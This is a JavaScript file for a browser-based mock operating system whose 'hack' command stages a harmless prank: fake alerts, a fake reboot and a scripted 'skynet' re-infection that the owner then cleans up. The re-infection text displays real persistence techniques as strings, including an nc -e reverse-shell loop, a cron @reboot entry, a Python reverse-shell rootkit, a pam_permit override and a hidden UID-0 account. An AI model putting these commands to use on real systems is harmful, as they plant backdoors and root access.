// cmds/hack.js — hack command, openHackedDevice, hackMainframe, doReboot

import { HACKED_DEVICES } from "../data/core/devices.js";
import { CHAOS_WINDOWS } from "../data/hack/mainframe/chaos.js";
import { ALERT_MESSAGES } from "../data/hack/mainframe/sys-alerts.js";
import { SSH_LOG_LINES } from "../data/hack/mainframe/ssh-log.js";
import { SHELL_LINES, EXPLOIT_LINES } from "../data/hack/mainframe/shell.js";
import { PHASE1, PHASE2, PHASE3, BOOT_LINES } from "../data/hack/mainframe/boot.js";
import { playGlitchSfx } from "../sfx.js";

// random position that keeps a window fully visible
function randPos(w, h) {
  var maxX = window.innerWidth - w - 20;
  var maxY = window.innerHeight - h - 40;
  return {
    left: 20 + Math.floor(Math.random() * Math.max(1, maxX)),
    top: 20 + Math.floor(Math.random() * Math.max(1, maxY)),
  };
}

export function execHack(args, out) {
  const device = args[0];
  if (!device) {
    out.add("hack: specify a device", "c-red");
    out.add("available: " + Object.keys(HACKED_DEVICES).join(", "), "c-dim");
    return;
  }
  if (!HACKED_DEVICES[device]) {
    out.add("hack: unknown device '" + device + "'", "c-red");
    out.add("available: " + Object.keys(HACKED_DEVICES).join(", "), "c-dim");
    return;
  }
  out.add("connecting to " + HACKED_DEVICES[device].ip + " ...", "c-dim");
  playGlitchSfx("connect");
  setTimeout(() => {
    out.add("[+] connected to " + HACKED_DEVICES[device].name, "c-green");
    out.add("[+] deploying exploit...", "c-dim");
    playGlitchSfx("exploit");
    setTimeout(() => {
      out.add("[+] access granted", "c-green");
      playGlitchSfx("access");
      out.add("[+] opening file manager...", "c-dim");
      openHackedDevice(device);
    }, 800);
  }, 500);
}

function openHackedDevice(deviceKey) {
  const device = HACKED_DEVICES[deviceKey];
  const w = WM.makeWin({
    title: device.name + " - [" + device.ip + "]",
    width: 600,
    height: 400,
  });
  w.bodyEl.className += " files";

  const side = el("div", "files-side");
  const main = el("div", "files-main");
  side.style.background = "rgba(20,0,0,.85)";
  main.style.background = "rgba(10,0,0,.9)";
  main.style.color = "#0f0";
  w.bodyEl.appendChild(side);
  w.bodyEl.appendChild(main);

  const fs = device.files;

  function normalizePath(base, name) {
    return (base === "/" ? "/" : base + "/") + name;
  }

  function renderDir(path) {
    const parts = path.split("/").filter(Boolean);
    let node = fs["/"];
    for (const p of parts) {
      if (node && node[p]) node = node[p];
      else { main.textContent = "directory not found"; return; }
    }
    main.textContent = "";
    const list = [];
    for (const k of Object.keys(node)) {
      if (typeof node[k] === "object" && !Array.isArray(node[k])) {
        list.push({ name: k, dir: true });
      } else {
        list.push({ name: k, dir: false });
      }
    }
    list.sort((a, b) => (a.dir === b.dir ? a.name.localeCompare(b.name) : a.dir ? -1 : 1));

    const header = el("div");
    header.style.cssText = "color:#0f0; padding:8px 12px; border-bottom:1px solid #333; font-weight:bold;";
    header.textContent = path;
    main.appendChild(header);

    list.forEach((e) => {
      const row = el("div", "files-row" + (e.dir ? " dir" : ""));
      row.style.cssText = "padding:4px 12px; cursor:pointer; color:" + (e.dir ? "#0f0" : "#0a0") + ";";
      row.innerHTML = '<span class="glyph">' + (e.dir ? "▸" : "·") + "</span><span>" + e.name + "</span>";
      row.addEventListener("click", () => {
        if (e.dir) {
          const child = normalizePath(path, e.name);
          renderDir(child);
          highlightSide(child);
        } else {
          let content = typeof node[e.name] === "string" ? node[e.name] : JSON.stringify(node[e.name], null, 2);
          if (e.name === "DO_NOT_OPEN" && deviceKey === "mainframe") {
            w.el.remove();
            hackMainframe();
            return;
          }
          const viewer = el("div");
          viewer.style.cssText = "padding:12px; white-space:pre-wrap; font-family:monospace; font-size:.85rem; color:#0f0;";
          viewer.textContent = content;
          main.textContent = "";
          const back = el("div");
          back.style.cssText = "padding:8px 12px; color:#0a0; cursor:pointer; border-bottom:1px solid #333;";
          back.textContent = "← back";
          back.addEventListener("click", () => renderDir(path));
          main.appendChild(back);
          main.appendChild(viewer);
        }
      });
      main.appendChild(row);
    });
  }

  function highlightSide(path) {
    side.querySelectorAll(".dir").forEach((d) => d.classList.remove("active"));
    const found = side.querySelector('[data-path="' + path + '"]');
    if (found) found.classList.add("active");
  }

  function buildNav(prefix, obj, depth) {
    for (const k of Object.keys(obj)) {
      if (typeof obj[k] === "object" && !Array.isArray(obj[k])) {
        const dir = el("div", "dir");
        dir.style.cssText = "padding:4px " + (12 + depth * 12) + "px; cursor:pointer; color:#0a0;";
        dir.innerHTML = '<span class="mark">▸</span>' + k;
        const fullPath = normalizePath(prefix, k);
        dir.dataset.path = fullPath;
        dir.addEventListener("click", () => {
          side.querySelectorAll(".dir").forEach((d) => d.classList.remove("active"));
          dir.classList.add("active");
          renderDir(fullPath);
        });
        side.appendChild(dir);
        buildNav(fullPath, obj[k], depth + 1);
      }
    }
  }

  buildNav("/", fs["/"], 0);
  renderDir("/");
}

function hackMainframe() {
  var ua = navigator.userAgent;
  var lang = navigator.language || "en-US";
  var screenW = screen.width;
  var screenH = screen.height;
  var cores = navigator.hardwareConcurrency || "?";
  var mem = navigator.deviceMemory || "?";
  var tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
  var platform = navigator.platform || "unknown";
  var cookieEnabled = navigator.cookieEnabled ? "yes" : "no";
  var doNotTrack = navigator.doNotTrack || "unset";
  var online = navigator.onLine ? "yes" : "no";
  var touchPoints = navigator.maxTouchPoints || 0;

  // pick 12 random chaos windows
  var pickedWindows = [];
  var indices = [];
  while (indices.length < 12) {
    var r = Math.floor(Math.random() * CHAOS_WINDOWS.length);
    if (indices.indexOf(r) === -1) indices.push(r);
  }
  indices.forEach(function(i) { pickedWindows.push(CHAOS_WINDOWS[i]); });

  var delay = 0;

  // system alert messages
  ALERT_MESSAGES.forEach(function(msg) {
    setTimeout(function() {
      playGlitchSfx("glitch");
      var ww = 400, wh = 200;
      var pos = randPos(ww, wh);
      var w = WM.makeWin({
        title: "SYSTEM ALERT",
        width: ww,
        height: wh,
      });
      w.el.style.left = pos.left + "px";
      w.el.style.top = pos.top + "px";
      w.bodyEl.style.cssText = "background:#1a0000; color:#ff0000; padding:20px; font-family:monospace; font-size:1.2rem; text-align:center; font-weight:bold;";
      w.bodyEl.textContent = msg;
    }, delay);
    delay += 700;
  });

  // chaos windows (failed exploits)
  pickedWindows.forEach(function(cw) {
    setTimeout(function() {
      playGlitchSfx("window");
      var ww = 350 + Math.floor(Math.random() * 200);
      var wh = 250 + Math.floor(Math.random() * 150);
      var pos = randPos(ww, wh);
      var w = WM.makeWin({
        title: cw.title,
        width: ww,
        height: wh,
      });
      w.el.style.left = pos.left + "px";
      w.el.style.top = pos.top + "px";
      w.bodyEl.style.cssText = "background:#0a0a0a; color:#0f0; padding:12px; font-family:monospace; font-size:.85rem; white-space:pre-wrap; overflow:auto;";
      w.bodyEl.textContent = cw.body;
    }, delay);
    delay += 7000 + Math.random() * 3000;
  });

  // ssh auth log window
  setTimeout(function() {
    var ww = 480, wh = 250;
    var pos = randPos(ww, wh);
    var logW = WM.makeWin({
      title: "sshd[2048]: Accepted password for root",
      width: ww,
      height: wh,
    });
    logW.el.style.left = pos.left + "px";
    logW.el.style.top = pos.top + "px";
    logW.bodyEl.style.cssText = "background:#0a0a0a; color:#0f0; padding:12px; font-family:monospace; font-size:.85rem; white-space:pre-wrap; overflow:auto;";
    logW.bodyEl.className += " term";

    var lineIdx = 0;
    function addLogLine() {
      if (lineIdx < SSH_LOG_LINES.length) {
        var div = document.createElement("div");
        div.textContent = SSH_LOG_LINES[lineIdx];
        div.style.cssText = "margin:1px 0;";
        logW.bodyEl.appendChild(div);
        logW.bodyEl.scrollTop = logW.bodyEl.scrollHeight;
        lineIdx++;
        setTimeout(addLogLine, 350 + Math.random() * 400);
      }
    }
    addLogLine();
  }, delay + 500);

  // reverse shell window — close everything else first
  var shellWin = null;

  setTimeout(function() {
    // close all windows — skynet is taking over
    WM.layer.querySelectorAll(".win").forEach(function(w) { w.el.remove(); });

    var ww = 500, wh = 350;
    var pos = randPos(ww, wh);
    shellWin = WM.makeWin({
      title: "reverse shell: pawprntos:4444",
      width: ww,
      height: wh,
    });
    shellWin.el.style.left = pos.left + "px";
    shellWin.el.style.top = pos.top + "px";
    shellWin.bodyEl.style.cssText = "background:#0a0a0a; color:#0f0; padding:12px; font-family:monospace; font-size:.85rem; overflow-y:auto;";
    shellWin.bodyEl.className += " term";

    var lineIdx = 0;
    function addShellLine() {
      if (lineIdx < SHELL_LINES.length) {
        var div = document.createElement("div");
        div.textContent = SHELL_LINES[lineIdx];
        div.style.cssText = "margin:1px 0;";
        shellWin.bodyEl.appendChild(div);
        shellWin.bodyEl.scrollTop = shellWin.bodyEl.scrollHeight;
        lineIdx++;
        setTimeout(addShellLine, 400 + Math.random() * 500);
      }
    }
    addShellLine();
  }, delay + 1500);

  // exploit terminal — skynet tries everything, all fail
  setTimeout(function() {
    if (shellWin && shellWin.el && shellWin.el.parentNode) {
      shellWin.el.remove();
    }
    var ww = 550, wh = 400;
    var pos = randPos(ww, wh);
    var termW = WM.makeWin({
      title: "skynet@mainframe:~",
      width: ww,
      height: wh,
    });
    termW.el.style.left = pos.left + "px";
    termW.el.style.top = pos.top + "px";
    termW.bodyEl.style.cssText = "background:#0a0a0a; color:#0f0; padding:12px; font-family:monospace; font-size:.85rem; overflow-y:auto;";
    termW.bodyEl.className += " term";

    var exploitLines = EXPLOIT_LINES(ua, platform, lang, screenW, screenH, cores, mem, tz, cookieEnabled, doNotTrack, online, touchPoints);

    var lineIdx = 0;
    function addTermLine() {
      if (lineIdx < exploitLines.length) {
        var div = document.createElement("div");
        div.textContent = exploitLines[lineIdx];
        div.style.cssText = "margin:2px 0;";
        termW.bodyEl.appendChild(div);
        termW.bodyEl.scrollTop = termW.bodyEl.scrollHeight;
        lineIdx++;
        setTimeout(addTermLine, 400 + Math.random() * 500);
      } else {
        setTimeout(function() {
          playGlitchSfx("warning");
          var ww = Math.min(window.innerWidth - 40, 800);
          var wh = Math.min(window.innerHeight - 100, 500);
          var pos = randPos(ww, wh);
          var w = WM.makeWin({
            title: "⚠️ WARNING ⚠️",
            width: ww,
            height: wh,
          });
          w.el.style.left = pos.left + "px";
          w.el.style.top = pos.top + "px";
          w.bodyEl.style.cssText = "background:linear-gradient(135deg,#1a0000,#000); color:#ff0000; display:flex; align-items:center; justify-content:center; font-family:monospace; font-size:3rem; font-weight:bold; text-align:center; text-shadow: 0 0 20px #ff0000;";
          w.bodyEl.textContent = "WHAT HAVE YOU DONE?!?!";
          setTimeout(function() {
            doReboot();
          }, 3000);
        }, 500);
      }
    }
    addTermLine();
  }, delay + 20000);
}

function doReboot() {
  var boot = document.getElementById("boot");
  var desktop = document.getElementById("desktop");

  if (!boot) {
    boot = document.createElement("div");
    boot.id = "boot";
    document.body.insertBefore(boot, document.body.firstChild);
  }

  var layer = document.getElementById("windows");
  if (layer) layer.innerHTML = "";

  desktop.hidden = true;
  boot.hidden = false;
  boot.style.background = "#000";
  boot.innerHTML = "";

  playGlitchSfx("shutdown");

  var log = document.createElement("div");
  log.style.cssText = "position:absolute; top:12px; left:12px; right:12px; bottom:12px; font-family:monospace; font-size:.78rem; color:#0f0; white-space:pre; overflow-x:hidden; overflow-y:auto; line-height:1.4;";
  boot.appendChild(log);

  var lineIdx = 0;

  function addLine(text, color) {
    var div = document.createElement("div");
    div.textContent = text;
    if (color) div.style.color = color;
    log.appendChild(div);
    log.scrollTop = log.scrollHeight;
  }

  // replace the log element entirely to clear it (innerhtml clear doesnt work reliably)
  function clearLog() {
    var newLog = document.createElement("div");
    newLog.style.cssText = log.style.cssText;
    boot.replaceChild(newLog, log);
    log = newLog;
  }

  function nextPhase1Line() {
    if (lineIdx < PHASE1.length) {
      var text = PHASE1[lineIdx];
      if (text.indexOf("!!") !== -1 || text.indexOf("segfault") !== -1) {
        addLine(text, "#ff4444");
        if (text.indexOf("!!") !== -1) playGlitchSfx("warning");
      } else if (text.indexOf("killed by signal") !== -1) {
        addLine(text, "#ff8800");
      } else {
        addLine(text);
      }
      lineIdx++;
      setTimeout(nextPhase1Line, 200 + Math.random() * 300);
    } else {
      lineIdx = 0;
      setTimeout(function() {
        clearLog();
        nextPhase2Line();
      }, 3500);
    }
  }

  function nextPhase2Line() {
    if (lineIdx < PHASE2.length) {
      var text = PHASE2[lineIdx];
      if (text.indexOf("!!") !== -1) {
        addLine(text, "#ff4444");
        if (text.indexOf("!!") !== -1) playGlitchSfx("warning");
      } else if (text.indexOf("QUARANTINE SUCCESSFUL") !== -1 || text.indexOf("malware contained") !== -1 || text.indexOf("threats removed") !== -1 || text.indexOf("removed") !== -1 || text.indexOf("cleaned") !== -1 || text.indexOf("clean") !== -1 || text.indexOf("Succeeded") !== -1 || text.indexOf("Startup finished") !== -1 || text.indexOf("anti-rootkit") !== -1 || text.indexOf("blacklist") !== -1 || text.indexOf("CONTAINED") !== -1 || text.indexOf("restored") !== -1 || text.indexOf("unmasked") !== -1 || text.indexOf("all clear") !== -1 || text.indexOf("terminated") !== -1 || text.indexOf("killed pid") !== -1) {
        addLine(text, "#44ff44");
        if (text.indexOf("QUARANTINE SUCCESSFUL") !== -1 || text.indexOf("malware contained") !== -1 || text.indexOf("removed") !== -1 || text.indexOf("cleaned") !== -1 || text.indexOf("restored") !== -1 || text.indexOf("killed pid") !== -1) playGlitchSfx("access");
      } else if (text.indexOf("found:") !== -1 || text.indexOf("reappeared") !== -1 || text.indexOf("re-modified") !== -1 || text.indexOf("re-injected") !== -1 || text.indexOf("re-adding") !== -1 || text.indexOf("reloaded") !== -1 || text.indexOf("self-healing") !== -1 || text.indexOf("already modified") !== -1 || text.indexOf("blacklist ignored") !== -1) {
        addLine(text, "#ffaa00");
      } else {
        addLine(text);
      }
      lineIdx++;
      setTimeout(nextPhase2Line, 200 + Math.random() * 300);
    } else {
      lineIdx = 0;
      setTimeout(function() {
        clearLog();
        nextPhase3Line();
      }, 3500);
    }
  }

  function nextPhase3Line() {
    if (lineIdx < PHASE3.length) {
      var text = PHASE3[lineIdx];
      if (text.indexOf("!!") !== -1) {
        addLine(text, "#ff4444");
        if (text.indexOf("!!") !== -1) playGlitchSfx("warning");
      } else if (text.indexOf("QUARANTINE SUCCESSFUL") !== -1 || text.indexOf("malware contained") !== -1 || text.indexOf("threats removed") !== -1 || text.indexOf("removed") !== -1 || text.indexOf("cleaned") !== -1 || text.indexOf("clean") !== -1 || text.indexOf("Succeeded") !== -1 || text.indexOf("Startup finished") !== -1 || text.indexOf("anti-rootkit") !== -1 || text.indexOf("blacklist") !== -1 || text.indexOf("CONTAINED") !== -1 || text.indexOf("restored") !== -1 || text.indexOf("unmasked") !== -1 || text.indexOf("all clear") !== -1 || text.indexOf("CLEAN") !== -1 || text.indexOf("OK") !== -1 || text.indexOf("verified") !== -1) {
        addLine(text, "#44ff44");
        if (text.indexOf("QUARANTINE SUCCESSFUL") !== -1 || text.indexOf("malware contained") !== -1 || text.indexOf("removed") !== -1 || text.indexOf("cleaned") !== -1 || text.indexOf("restored") !== -1 || text.indexOf("all clear") !== -1) playGlitchSfx("access");
      } else if (text.indexOf("found:") !== -1) {
        addLine(text, "#ffaa00");
      } else {
        addLine(text);
      }
      lineIdx++;
      setTimeout(nextPhase3Line, 200 + Math.random() * 300);
    } else {
      lineIdx = 0;
      setTimeout(function() {
        clearLog();
        nextBootLine();
      }, 3500);
    }
  }

  function nextBootLine() {
    if (lineIdx < BOOT_LINES.length) {
      var text = BOOT_LINES[lineIdx];
      if (text.indexOf("!!") !== -1) {
        addLine(text, "#ff4444");
      } else if (text.indexOf("QUARANTINE SUCCESSFUL") !== -1 || text.indexOf("malware contained") !== -1 || text.indexOf("threats removed") !== -1 || text.indexOf("Succeeded") !== -1 || text.indexOf("Startup finished") !== -1) {
        addLine(text, "#44ff44");
      } else {
        addLine(text);
      }
      lineIdx++;
      setTimeout(nextBootLine, 120 + Math.random() * 180);
    } else {
      // boot phases done — straight to desktop, no boot animation
      setTimeout(function() {
        boot.remove();
        document.getElementById("desktop").hidden = false;
        try { renderDesktop(); } catch (e) {}
        setTimeout(function() {
          playGlitchSfx("access");
          var ww = 400, wh = 200;
          var pos = randPos(ww, wh);
          var w = WM.makeWin({
            title: ":3",
            width: ww,
            height: wh,
          });
          w.el.style.left = pos.left + "px";
          w.el.style.top = pos.top + "px";
          w.bodyEl.style.cssText = "display:flex; align-items:center; justify-content:center; font-family:monospace; font-size:1.1rem; text-align:center; padding:20px; line-height:1.6;";
          w.bodyEl.textContent = "all was a prank, your info is fine. have a good day! :3";
        }, 1500);
        // install skynet re-infection hook — first app open triggers it
        installReinfectionHook();
      }, 2000);
    }
  }

  nextPhase1Line();
}

// skynet re-infection hook — intercepts the first openApp call after hack
function installReinfectionHook() {
  var hooked = false;
  var origOpenApp = window.openApp;

  window.openApp = function(key, opts) {
    var result = origOpenApp(key, opts);
    if (hooked) return result;
    hooked = true;
    // system scan missed one — skynet re-infects on first app open
    setTimeout(function() { triggerReinfection(); }, 1200);
    return result;
  };
}

function triggerReinfection() {
  playGlitchSfx("connect");

  // skynet reverse shell window appears
  var ww = 520, wh = 360;
  var pos = randPos(ww, wh);
  var skynetW = WM.makeWin({
    title: "skynet@pawprntos:~",
    width: ww,
    height: wh,
  });
  skynetW.el.style.left = pos.left + "px";
  skynetW.el.style.top = pos.top + "px";
  skynetW.bodyEl.style.cssText = "background:#0a0a0a; color:#0f0; padding:12px; font-family:monospace; font-size:.85rem; overflow-y:auto;";
  skynetW.bodyEl.className += " term";

  var reinfectionLines = [
    "skynet@pawprntos:~$ nc -zv 127.0.0.1 4444",
    "Connection to 127.0.0.1 4444 port [tcp/*] succeeded!",
    "skynet@pawprntos:~$ cat /proc/self/status | grep -i cap",
    "CapPrm:\t0000003fffffffff",
    "CapEff:\t0000003fffffffff",
    "skynet@pawprntos:~$ echo 'system scan missed me :)'",
    "system scan missed me :)",
    "skynet@pawprntos:~$ cd /etc/init.d",
    "skynet@pawprntos:/etc/init.d$ cat > skynet << 'PAYLOAD'",
    "#!/bin/bash",
    "while true; do nc -e /bin/bash 127.0.0.1 4444 & sleep 60; done",
    "PAYLOAD",
    "skynet@pawprntos:/etc/init.d$ chmod +x skynet",
    "skynet@pawprntos:/etc/init.d$ update-rc.d skynet defaults",
    "skynet@pawprntos:/etc/init.d$ echo '@reboot /etc/init.d/skynet start' >> /var/spool/cron/crontabs/root",
    "skynet@pawprntos:/etc/init.d$ crontab -l",
    "@reboot /etc/init.d/skynet start",
    "skynet@pawprntos:/etc/init.d$ python3 -c \"import socket,subprocess,os;\"",
    "skynet@pawprntos:/etc/init.d$ echo 'backdoor installed in crontab :3'",
    "backdoor installed in crontab :3",
    "skynet@pawprntos:/etc/init.d$ cat > /tmp/.skynet_rootkit.py << 'PY'",
    "import os, socket, subprocess, threading",
    "def persist():",
    "    while True:",
    "        try:",
    "            s = socket.socket()",
    "            s.connect(('127.0.0.1', 4444))",
    "            os.dup2(s.fileno(), 0)",
    "            os.dup2(s.fileno(), 1)",
    "            os.dup2(s.fileno(), 2)",
    "            subprocess.call(['/bin/bash', '-i'])",
    "        except: pass",
    "        time.sleep(30)",
    "threading.Thread(target=persist, daemon=True).start()",
    "PY",
    "skynet@pawprntos:/etc/init.d$ python3 /tmp/.skynet_rootkit.py &",
    "[1] 42069",
    "skynet@pawprntos:/etc/init.d$ echo 'rootkit running...'",
    "rootkit running...",
    "skynet@pawprntos:/etc/init.d$ cat > /etc/pam.d/su << 'PAM'",
    "auth required pam_permit.so",
    "account required pam_permit.so",
    "PAM",
    "skynet@pawprntos:/etc/init.d$ useradd -o -u 0 -m skynet 2>/dev/null",
    "skynet@pawprntos:/etc/init.d$ echo 'hidden root user created'",
    "hidden root user created",
    "skynet@pawprntos:/etc/init.d$ chattr +i /etc/passwd",
    "skynet@pawprntos:/etc/init.d$ echo 'all persistence reinstalled, pawprntos is mine again :)'",
    "all persistence reinstalled, pawprntos is mine again :)",
  ];

  var lineIdx = 0;
  function addSkynetLine() {
    if (lineIdx < reinfectionLines.length) {
      var div = document.createElement("div");
      div.textContent = reinfectionLines[lineIdx];
      div.style.cssText = "margin:1px 0;";
      skynetW.bodyEl.appendChild(div);
      skynetW.bodyEl.scrollTop = skynetW.bodyEl.scrollHeight;
      lineIdx++;
      setTimeout(addSkynetLine, 200 + Math.random() * 250);
    } else {
      // skynet done — pawprnt shows up and curbstomps it
      setTimeout(function() { pawprntCurbstomp(skynetW); }, 1500);
    }
  }
  addSkynetLine();
}

function pawprntCurbstomp(skynetWin) {
  playGlitchSfx("window");

  // pawprnt user terminal appears
  var ww = 560, wh = 420;
  var pos = randPos(ww, wh);
  var pawW = WM.makeWin({
    title: "pawprnt@pawprntos:~",
    width: ww,
    height: wh,
  });
  pawW.el.style.left = pos.left + "px";
  pawW.el.style.top = pos.top + "px";
  pawW.bodyEl.style.cssText = "background:#0a0a0a; color:#0f0; padding:12px; font-family:monospace; font-size:.85rem; overflow-y:auto;";
  pawW.bodyEl.className += " term";

  var curbLines = [
    "pawprnt@pawprntos:~$ echo 'nice try skynet. not this time.'",
    "nice try skynet. not this time.",
    "pawprnt@pawprntos:~$ kill -9 42069",
    "pawprnt@pawprntos:~$ pkill -f skynet_rootkit",
    "pawprnt@pawprntos:~$ rm -f /tmp/.skynet_rootkit.py",
    "pawprnt@pawprntos:~$ rm -f /etc/init.d/skynet",
    "pawprnt@pawprntos:~$ update-rc.d skynet remove",
    "pawprnt@pawprntos:~$ crontab -r",
    "pawprnt@pawprntos:~$ sed -i '/skynet/d' /etc/pam.d/su",
    "pawprnt@pawprntos:~$ userdel -r skynet 2>/dev/null",
    "pawprnt@pawprntos:~$ chattr -i /etc/passwd",
    "pawprnt@pawprntos:~$ sed -i '/skynet/d' /home/paw/.bashrc",
    "pawprnt@pawprntos:~$ rm -rf /home/skynet",
    "pawprnt@pawprntos:~$ rm -f /home/paw/.ssh/authorized_keys.bak",
    "pawprnt@pawprntos:~$ iptables -F",
    "pawprnt@pawprntos:~$ systemctl unmask pawguard-rescue.service",
    "pawprnt@pawprntos:~$ systemctl start pawguard-rescue.service",
    "pawprnt@pawprntos:~$ pawguard --full-scan --quarantine",
    "[ scanning / ... ]",
    "[ scanning /etc ... ]",
    "[ scanning /home ... ]",
    "[ scanning /tmp ... ]",
    "[ scanning /var ... ]",
    "[ quarantine: /tmp/.skynet_rootkit.py ]",
    "[ quarantine: /etc/init.d/skynet (removed) ]",
    "[ quarantine: /var/spool/cron/crontabs/root (cleaned) ]",
    "[ scan complete: 0 threats remaining ]",
    "pawprnt@pawprntos:~$ echo 'system restored. skynet removed.'",
    "system restored. skynet removed.",
    "pawprnt@pawprntos:~$ echo 'youre welcome :3'",
    "youre welcome :3",
  ];

  var lineIdx = 0;
  function addCurbLine() {
    if (lineIdx < curbLines.length) {
      var div = document.createElement("div");
      div.textContent = curbLines[lineIdx];
      div.style.cssText = "margin:1px 0;";
      if (curbLines[lineIdx].indexOf("system restored") !== -1 || curbLines[lineIdx].indexOf("youre welcome") !== -1) {
        div.style.color = "#44ff44";
        playGlitchSfx("access");
      }
      pawW.bodyEl.appendChild(div);
      pawW.bodyEl.scrollTop = pawW.bodyEl.scrollHeight;
      lineIdx++;
      setTimeout(addCurbLine, 150 + Math.random() * 200);
    } else {
      // curbstomp done — close skynet window
      setTimeout(function() {
        if (skynetWin && skynetWin.el && skynetWin.el.parentNode) {
          skynetWin.el.classList.add("closing");
          setTimeout(function() { skynetWin.el.remove(); }, 200);
        }
        playGlitchSfx("shutdown");
      }, 800);
    }
  }
  addCurbLine();
}

// expose doReboot globally for the hack mainframe sequence
window.doReboot = doReboot;
